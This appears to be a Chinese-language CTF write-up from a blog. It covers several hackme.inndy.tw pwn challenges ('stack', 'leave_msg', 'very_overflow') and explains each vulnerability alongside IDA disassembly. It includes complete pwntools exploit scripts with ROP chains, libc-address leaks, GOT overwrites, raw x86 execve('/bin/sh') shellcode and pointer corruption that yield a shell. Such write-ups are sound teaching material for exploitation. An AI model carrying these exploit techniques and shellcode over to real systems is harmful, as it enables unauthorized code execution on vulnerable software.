open("/home/ctf/flag")# read(fd,buf,0x10)# write(1,buf,0x10)#open("/home/ctf/flag")payload_1 = p32(0)*27 + p32(open_plt) + p32(start) + p32(flag_addr) + p32(0)gdb.attach(p,"b *0x804867D")pause()p.send(payload_1)#read(fd,buf,0x10)payload_2 = p32(0)*27 + p32(read_plt) + p32(start)payload_2 += p32(0x3) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_2)#write(1,buf,0x10)payload_3 = p32(0)*27 + p32(write_plt) + p32(0)payload_3 += p32(1) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_3)p.interactive() stack这题还是挺有意思的，程序主要做的事就是模拟一个栈的push，pop操作，并将自己模拟的栈放在函数栈帧中， 上图为栈的分布，我们可以看到，自己构造的esp也同样放在栈中，那么我们就可以通过pop,push操作控制esp的位置实现任意地址读，写，思路如下 ： 将esp指向esp所以在位置的上方，push写入改变esp指向libc_start_main+247的位置 pop出libc_start_main+247的值，利用偏移算出system及&quot;/bin/sh&quot;的真实地址 继续控制esp指向main的ret地址位置，修改为system的地址，以及参数&quot;/bin/sh&quot; x 退出即可get shell 好了，接下来详细讲一下过程以及上图是怎么来的 这是IDA反编译出来的东西，我看着是看不出什么有用的信息的，建议看汇编，如果单纯汇编很难看懂的话，可以跟着gdb一步步调试来理解，那我们看汇编 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.text:000006F0 public stack_push.text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p.text:000006F0.text:000006F0 arg_0 = dword ptr 8.text:000006F0 arg_4 = dword ptr 0Ch.text:000006F0.text:000006F0 ; __unwind &#123; .text:000006F0 push ebp.text:000006F1 mov ebp, esp.text:000006F3 ; 4: result = *a1;.text:000006F3 call __x86_get_pc_thunk_ax.text:000006F8 add eax, 18C8h.text:000006FD mov eax, [ebp+arg_0].text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000702 ; 5: *a1 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[-254] + 1;.text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax].text:00000705 mov edx, [ebp+arg_0].text:00000708 mov [edx], ecx.text:0000070A ; 6: a1[result + 1] = a2;.text:0000070A mov edx, [ebp+arg_0].text:0000070D mov ecx, [ebp+arg_4].text:00000710 mov [edx+eax*4+4], ecx.text:00000714 ; 7: return result;.text:00000714 nop.text:00000715 pop ebp.text:00000716 retn----------------------------------------------------------------------------------------------.text:00000717 public stack_pop.text:00000717 stack_pop proc near ; CODE XREF: main+10C↓p.text:00000717.text:00000717 arg_0 = dword ptr 8.text:00000717.text:00000717 ; __unwind &#123;.text:00000717 push ebp.text:00000718 mov ebp, esp.text:0000071A call __x86_get_pc_thunk_ax.text:0000071F add eax, 18A1h.text:00000724 mov eax, [ebp+arg_0].text:00000727 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000729 lea edx, (unk_1FBF - 1FC0h)[eax].text:0000072C mov eax, [ebp+arg_0].text:0000072F mov ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax], edx.text:00000731 mov eax, [ebp+arg_0].text:00000734 mov edx, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000736 mov eax, [ebp+arg_0].text:00000739 mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4].text:0000073D pop ebp.text:0000073E retn.text:0000073E ; &#125; // starts at 717.text:0000073E stack_pop endp 可以看到，在进行push操作的时候mov [edx+eax*4+4], ecx是与ecx有关，pop的时候mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4]也是跟exc有关，到gdb里看一波 可以看到ecx存的是push的值（我输入的是123=0x7b）eax是与ebp的偏移（将初始esp看成ebp吧），edx是ebp，这里应该就能看出一开始给的图的上半部分了吧 单步一下可以看到我们push的值已经入栈，push的操作明白了我们来看一下pop的操作 因为我们已经先push一个0x7b，所以这次pop指向的就是0xffffcc4c处的0x7b并且esp更新为0(-1)，这就是pop的过程，理清这两个过程就可以来实现上面的4个思路了 首先要修改esp的值就是先将esp指向esp的上方，即0xffffcc44处，初始esp是指向0xffffcc48，所以只需要pop一下就可以了，然后就是修改esp的值 ，用push，修改为多少呢 修改esp指向libc_start_main的位置，也就是0x59 = 89，之后再用pop将地址泄漏出来，进而算出偏移，得到system跟&#39;/bin/sh&#39;的地址，得到地址之后就要找到main函数的返回地址，覆盖为system 我们再往下看多一点栈的内容，回到main，在0x8fb处下个断点，单步往下 看到这个栈帧是不是很熟悉，继续单步到ret处查看栈 对比一下可以很清楚的发现main函数的返回地址是第二个的libc_start_main而不是我们用来泄漏地址的位置，这就是一开始那张图的下半部分了，好了，那开始覆盖：将0xffffcdbc覆盖为system_addr，将0xffffcdc4覆盖为binsh_addr 写入的时候用还是跟泄漏地址时一样的做法，先将esp指向其上方，然后用push压入相应值 不过这里要注意的是，scanf的格式化字符是%d，它能接收的最大值是0x7fffffff而我们要写入的真实地址都是0xf7开头的，明显太大，所以我们要用负数去写，0xffffffff == -1，0xfffffffe == -2这样子就能写入我们要的真实地址了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-from pwn import *# p = process('./stack')p = remote("hackme.inndy.tw","7716")elf = ELF('./stack')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 泄漏libc_start_mainp.sendline('i\n89')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Pop -&gt; ')libc_main_addr = (int(p.recvuntil('\n')[:-1],10)&amp;0xffffffff)-247offset = libc_main_addr - libc.symbols['__libc_start_main']system_libc = libc.symbols['system']binsh_libc = libc.search("/bin/sh").next()system_addr = system_libc + offsetbinsh_addr = binsh_libc + offsetlog.info("libc_main_addr --&gt; &#123;&#125;".format(hex(libc_main_addr)))log.info("offset --&gt; &#123;&#125;".format(hex(offset)))log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))pause()p.recvuntil('Cmd &gt;&gt;\n')p.sendline('c')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 写入binshp.sendline('i\n94')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_binsh = 0xffffffff - binsh_addr+1payload = '-' + str(push_binsh)print payloadp.sendline(payload)# 写入system_addrfor i in range(3): p.recvuntil('Cmd &gt;&gt;\n') p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_system = 0xffffffff - system_addr + 1payload = '-' + str(push_system)p.sendline(payload)p.recvuntil('Cmd &gt;&gt;\n')p.sendline('x')p.interactive() leave_msg这一题可真是长姿势了呀，主要的知识有： strlen函数遇到&#39;\x00&#39;就会停止计算长度 atoi函数会跳过字符串前面的空格或者换行符，直到遇到数字才进行转换 也是最骚的，got表不一定是写入地址，也可以写入可执行代码（在特定的条件下：比如这一题got表是可执行的，就可以） 其实一开始分析main函数的时候，就发现了改写got表的漏洞，但是因为既加了长度限定，又加了负数检测，一时间就卡住不知如何下手，但其实这几处保护是有缺陷的，这就涉及到了我上面讲到的3点知识，只要我们在8个字符后加&#39;\x00&#39;就可以路过strlen继续往栈输入内容，对于负数检测因为nptr是输入字符串的第一个字符，所以我们只要输入空格+负数，就可以跳这个检测了。接下来就是核心了，因为你会发现虽然可以修改got表了，但是，修改成哪个地址？这处程序既没有后门函数，也没有可泄漏地址的漏洞。 这里可以看到 0x804a000 到 0x804b000 居然是可执行的，这就说明我们可以修改got表为可执行代码了，但是同样有个问题就是，可写的代码长度只有8，所以是无法构造shellcode的，只能进行间接的跳转，而且程序的保护并没有开启NX，所以可以往栈里写入shellcode 然后修改got表为add esp ,*** jmp esp执行shellcode，所以接下来就是要先确定好这个偏移 构造一个&#39;a&#39;*8 + &#39;\x00&#39; + &#39;b&#39;*8这样&#39;a&#39;*8就会写入到puts的got表，整个buf也会写到栈中去，再在下一次的puts处下断点查看偏移：0x0804861d si，进入puts函数内部，这里就可以看到输入的字符相对esp的偏移是0x30，而我们的shellcode是在’\x00’后面，也就是’b’*8，所以got表中的跳转代码就应该是add esp,0x30+len(jmp)+1 ; jmp esp，就可以指向shellcode 了 exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *# p = process('./leave_msg')p = remote("hackme.inndy.tw","7715")context.log_level = 'debug'# 覆盖printf的got表 -76/4# 覆盖puts的got表 -64/4shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"shellcode_x86 += "\x0b\xcd\x80"jmp = '''add esp,0x36jmp esp'''jmp = asm(jmp)log.info("jmp_len --&gt; &#123;&#125;".format(len(jmp))) #5pause()p.recvuntil("message:\n")payload = jmppayload += '\x00'payload += shellcode_x86# p.sendline("aaaaaaaa\x00bbbbbbbb") # 跟esp的偏移是0x30(+9?就是'bbbbbbbb'跟 esp的偏移)p.sendline(payload)p.recvuntil("slot?\n")# gdb.attach(p,"b *0x8048661")# pause()p.sendline(" -16")p.interactive() very_overflow这题就有意思了，同样是可以实现任意地址读写，不过这次是通过控制结构体的指针来实现，不过这里定义的结构体有点简单，只有指向下一个结构体的指针next和数据data 先add 一个数据进去，在gdb中下断点看一下情况 在这里可以看到结构体在栈中的存储方式是 node-&gt;next node-&gt;data（不明白aa上面为什么是next指针的话，可以再add一个然后查看栈就明白了）而且node-&gt;next = (node + strlen(node-&gt;data) + 5);，所以当add多个node的时候，next跟data是紧挨着排下来的，data跟next中间只隔着一个&#39;\x00&#39;，我一开始在知道这个布局后并没有想到什么有用的利用条件（还是太菜了），但是正常这样紧挨着的布局，使得一种可能：修改node[0]的data从而覆盖node[1]在next达到控制next指针的目的，控制了指向就可以任意地址读写了。 因为show函数会将next指向打印出来，这样就知道了栈地址，计算出node[0]-&gt;next跟libc_start_main的偏移，就可以修改指向通过show将它打印出来，接下来算出system的真实地址用同样的方法写入到返回地址处就行了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./very_overflow')p = remote("hackme.inndy.tw","7705")elf = ELF('./very_overflow')libc = ELF('./libc-2.23.so.i386')# libc = elf.libcp.recvuntil('Your action: ')p.sendline('1')p.recvuntil('Input your note: ')p.sendline('ab')p.recvuntil('Your action: ')p.sendline('1')p.recvuntil('Input your note: ')p.sendline('ab')# 得到node[0]-&gt;next,进而计算出libc_start_main的位置 p.recvuntil('Your action: ')p.sendline('3')p.recvuntil('Which note to show: ')p.sendline('0')p.recvuntil('Next note: ')main_addr = int(p.recv(10),16) + 0x4228ret_addr = main_addr - 0x4228 - 0x2clog.info("point to libc_main --&gt; &#123;&#125;".format(hex(main_addr)))log.info("ret_addr --&gt; &#123;&#125;".format(hex(ret_addr)))# pause()# 修改指针指向libc_start_mainp.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('0')p.recvuntil('Your new data: ')# gdb.attach(p,"b *0x8048705")# pause()p.sendline('aaaa'+p32(main_addr))# show libc_start_mainp.recvuntil('Your action: ')p.sendline('3')p.recvuntil('Which note to show: ')# gdb.attach(p,"b*0x804879c")# pause()p.sendline('2')p.recvuntil('Next note: ')libc_main = int(p.recv(10),16)-247log.info("libc_main --&gt; &#123;&#125;".format(hex(libc_main)))# pause()offset = libc_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']binsh_addr = offset + libc.search("/bin/sh").next()log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))# pause()# 修改指针指向ret地址上一个位置（即将ret地址当作node-&gt;data)p.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('0')p.recvuntil('Your new data: ')# gdb.attach(p,"b *0x8048705")# pause()p.sendline('aaaa'+p32(ret_addr))# 写入p.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('2')p.recvuntil('Your new data: ')payload = p32(system_addr) + 'bbbb' + p32(binsh_addr)# gdb.attach(p,"b *0x8048705")# pause()p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
</search>
